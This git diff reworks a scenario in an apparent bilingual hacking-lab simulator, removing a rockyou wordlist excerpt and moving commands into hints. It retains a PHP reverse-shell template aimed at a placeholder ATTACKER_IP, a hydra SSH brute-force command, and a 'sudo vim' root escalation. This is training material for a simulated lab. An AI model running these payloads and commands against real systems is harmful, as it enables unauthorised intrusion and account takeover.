@@ -5,24 +5,6 @@
 import type { Machine, Scenario, Port } from '../types';
 import { buildScenario, createFile, createLinuxFileSystem } from './templates';
 
-// MACs únicas para máquinas atacantes (evita colisiones entre escenarios)
-const ATTACKER_MACS = ['08:00:27:AA:BB:CC', '08:00:27:AA:BB:CD', '08:00:27:AA:BB:CE'];
-let attackerCount = 0;
-
-// Resetea el contador de MACs al cambiar de escenario
-export function resetAttackerCounter() { attackerCount = 0; }
-
-export function createAttackerMachine(networkRange: string, customHostname?: string): Machine {
-  const mac = ATTACKER_MACS[attackerCount % ATTACKER_MACS.length];
-  attackerCount++;
-  return {
-    id: 'attacker-01',
-    machine_info: { hostname: customHostname || 'kali-attacker', ip: '', mac, os: 'Kali Linux 2023.4', status: 'up', type: 'workstation' },
-    discovery_level: 4, scan_results: { ports: [] }, web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
-    learning_steps: [], files: createLinuxFileSystem({ username: 'kali' }),
-  };
-}
-
 export const COMMON_PORTS = {
   ssh: (version = 'OpenSSH 8.2p1 Ubuntu', creds?: { user: string; pass: string }): Port => ({ port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version, credentials: creds }),
   ftp: (version = 'vsFTPd 3.0.3'): Port => ({ port: 21, protocol: 'tcp', state: 'open', service: 'ftp', version }),
@@ -32,81 +14,6 @@ export const COMMON_PORTS = {
 const REVERSE_SHELL_PAYLOAD = {
   phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
 };
-
-// Contenido del diccionario rockyou.txt (versión reducida para el lab)
-const ROCKYOU_CONTENT = `password
-123456
-12345678
-qwerty
-abc123
-monkey
-letmein
-dragon
-111111
-baseball
-princess
-1234567
-football
-mickey
-buster
-daniel
-andrew
-hello
-love
-admin
-welcome
-password123
-sunshine
-master
-photoshop
-iloveyou
-123123
-666666
-1q2w3e4r
-football1
-charlie
-aa123456
-jesus
-password1
-whatever
-121212
-dragon1
-qwerty123
-mustang
-trustno1
-batman
-passw0rd
-welcome1
-qazwsx
-123qwe
-killer
-michael
-jordan
-superman
-harley
-ranger
-hunter
-fuckyou
-ilovelinux
-thomas
-pepper
-joshua
-maggie
-starwars
-silver
-ashley
-tigger
-purple
-andrew1
-justin
-buster1
-matthew
-jonathan
-buster12
-amanda
-william
-makaveli1
-`;
 
 // Datos específicos para el escenario FTP + Brute Force + Privilege Escalation
 const scenario05Data = {
@@ -197,16 +104,16 @@ whoami`, type: 'text' },
     ],
   },
   learningSteps: [
-    { id: 1, task: 'Host Discovery', taskEs: 'Descubrimiento de host', text: 'Discover the active host on the network: arp-scan <network/cidr>', textEs: 'Descubrí el host activo en la red: arp-scan <network/cidr>', discoveryLevel: 1, targetMachineId: 'lab-scenario-05-target' },
-    { id: 2, task: 'Port Scanning', taskEs: 'Escaneo de puertos', text: 'Identify available services: nmap -sV <target-ip>', textEs: 'Identificá los servicios disponibles: nmap -sV <target-ip>', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target' },
-    { id: 3, task: 'Anonymous FTP Access', taskEs: 'Acceso FTP anónimo', text: 'Connect to the FTP server with anonymous access: ftp <target-ip> (user: anonymous)', textEs: 'Conectate al servidor FTP con acceso anónimo: ftp <target-ip> (usuario: anonymous)', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target' },
-    { id: 4, task: 'Download Note', taskEs: 'Descargar nota', text: 'List available files (ls) and download the note: get nota.txt', textEs: 'Listá los archivos disponibles (ls) y descargá la nota: get nota.txt', discoveryLevel: 0, targetMachineId: 'lab-scenario-05-target' },
-    { id: 5, task: 'Read Note', taskEs: 'Leer nota', text: 'Exit FTP (exit) and read the downloaded note: cat nota.txt', textEs: 'Salí del FTP (exit) y leé la nota descargada: cat nota.txt', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target' },
-    { id: 6, task: 'SSH Brute Force', taskEs: 'Fuerza bruta SSH', text: 'Get john\'s credentials: hydra -l john -P /usr/share/wordlists/rockyou.txt <target-ip> ssh', textEs: 'Obtené las credenciales de john: hydra -l john -P /usr/share/wordlists/rockyou.txt <target-ip> ssh', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target' },
-    { id: 7, task: 'SSH Access', taskEs: 'Acceso SSH', text: 'Connect with the found credentials: ssh john@<target-ip> <password>', textEs: 'Conectate con las credenciales encontradas: ssh john@<target-ip> <password>', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target' },
-    { id: 8, task: 'Sudo Enumeration', taskEs: 'Enumeración de sudo', text: 'Once inside, list sudo permissions: sudo -l', textEs: 'Una vez dentro, listá los permisos de sudo: sudo -l', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target' },
-    { id: 9, task: 'Privilege Escalation', taskEs: 'Escalada de privilegios', text: 'vim has NOPASSWD permissions. Use it to escalate: sudo vim -c \'!bash\'', textEs: 'vim tiene permisos NOPASSWD. Usalo para escalar: sudo vim -c \'!bash\'', discoveryLevel: 4, targetMachineId: 'lab-scenario-05-target' },
-    { id: 10, task: 'Capture Root Flag', taskEs: 'Capturar flag root', text: 'You are now root. Read the flag: cat /root/flag2.txt', textEs: 'Ahora sos root. Leé la flag: cat /root/flag2.txt', discoveryLevel: 4, targetMachineId: 'lab-scenario-05-target' },
+    { id: 1, task: 'Host Discovery', taskEs: 'Descubrimiento de host', text: 'Discover the active host on the network', textEs: 'Descubrí el host activo en la red', discoveryLevel: 1, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Use arp-scan to discover hosts', es: 'Usá arp-scan para descubrir hosts' }, hint2: { en: 'arp-scan 10.10.20.0/24', es: 'arp-scan 10.10.20.0/24' } } },
+    { id: 2, task: 'Port Scanning', taskEs: 'Escaneo de puertos', text: 'Identify the services running on the target', textEs: 'Identificá los servicios que corren en el objetivo', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Use nmap for port scanning', es: 'Usá nmap para escanear puertos' }, hint2: { en: 'nmap -sV <target-ip>', es: 'nmap -sV <ip-objetivo>' } } },
+    { id: 3, task: 'Anonymous FTP Access', taskEs: 'Acceso FTP anónimo', text: 'Connect to the FTP server with anonymous access', textEs: 'Conectate al servidor FTP con acceso anónimo', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Connect using FTP client', es: 'Conectate usando el cliente FTP' }, hint2: { en: 'ftp <ip> then login as: anonymous', es: 'ftp <ip> luego logueate como: anonymous' } } },
+    { id: 4, task: 'Download Note', taskEs: 'Descargar nota', text: 'List and download the note file from FTP', textEs: 'Listá y descargá el archivo de nota desde FTP', discoveryLevel: 0, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Use FTP commands to navigate', es: 'Usá comandos FTP para navegar' }, hint2: { en: 'ls to list, get nota.txt to download', es: 'ls para listar, get nota.txt para descargar' } } },
+    { id: 5, task: 'Read Note', taskEs: 'Leer nota', text: 'Exit FTP and read the downloaded note', textEs: 'Salí del FTP y leé la nota descargada', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Type exit to leave FTP session', es: 'Escribí exit para salir de la sesión FTP' }, hint2: { en: 'cat nota.txt', es: 'cat nota.txt' } } },
+    { id: 6, task: 'SSH Brute Force', taskEs: 'Fuerza bruta SSH', text: 'Perform a brute force attack to get john\'s SSH credentials', textEs: 'Realizá un ataque de fuerza bruta para obtener las credenciales SSH de john', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Use hydra for brute force attack', es: 'Usá hydra para el ataque de fuerza bruta' }, hint2: { en: 'hydra -l john -P rockyou.txt <ip> ssh', es: 'hydra -l john -P rockyou.txt <ip> ssh' } } },
+    { id: 7, task: 'SSH Access', taskEs: 'Acceso SSH', text: 'Connect via SSH using the found credentials', textEs: 'Conectate por SSH usando las credenciales encontradas', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Connect via SSH with credentials', es: 'Conectate por SSH con las credenciales' }, hint2: { en: 'ssh john@<ip>', es: 'ssh john@<ip>' } } },
+    { id: 8, task: 'Sudo Enumeration', taskEs: 'Enumeración de sudo', text: 'Check your sudo permissions on the system', textEs: 'Verificá tus permisos de sudo en el sistema', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Check sudo permissions', es: 'Verificá los permisos de sudo' }, hint2: { en: 'sudo -l', es: 'sudo -l' } } },
+    { id: 9, task: 'Privilege Escalation', taskEs: 'Escalada de privilegios', text: 'Exploit sudo permissions to escalate to root', textEs: 'Explotá los permisos sudo para escalar a root', discoveryLevel: 4, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Exploit sudo permissions on vim', es: 'Explotá los permisos sudo de vim' }, hint2: { en: "sudo vim -c '!bash'", es: "sudo vim -c '!bash'" } } },
+    { id: 10, task: 'Capture Root Flag', taskEs: 'Capturar flag root', text: 'Read the root flag to complete the lab', textEs: 'Leé la flag de root para completar el laboratorio', discoveryLevel: 4, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: "You're root! Read the flag file", es: '¡Sos root! Leé el archivo de la flag' }, hint2: { en: 'cat /root/flag2.txt', es: 'cat /root/flag2.txt' } } },
   ],
 };
 
@@ -219,9 +126,6 @@ export const SCENARIO_TEMPLATES = {
     difficulty: 'Medium' as const,
     category: 'Network' as const,
     networkRange: scenario05Data.networkRange,
-    attackerFiles: [
-      createFile('/usr/share/wordlists/rockyou.txt', ROCKYOU_CONTENT, 'text'),
-    ],
     targetMachine: {
       id: scenario05Data.targetMachine.id,
       machine_info: {
